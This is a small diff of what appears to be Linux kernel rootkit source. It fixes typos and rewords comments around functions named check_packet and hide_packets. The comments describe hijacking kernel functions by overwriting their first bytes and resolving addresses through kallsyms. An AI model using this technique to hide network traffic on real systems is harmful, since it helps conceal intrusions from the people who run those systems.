@@ -94,7 +94,7 @@ unsigned int ipstr_to_int(char* ip_str)
 }
 
 /*
-*	Initiate fucntion hijacking by replacing the functions first bytes
+*	Initiate function hijacking by replacing the functions first bytes
 *	with the code mentioned above.
 *	
 */
@@ -174,7 +174,7 @@ static int check_packet(struct sk_buff* skb)
 }
 
 /*
-*	Get function addresses from kallsysms, since sysmap.h doesn't provide the symbols.
+*	Get function addresses from kallsysms, be independent of local data.
 *	Begin with the hijacking.
 */
 void hide_packets(void){
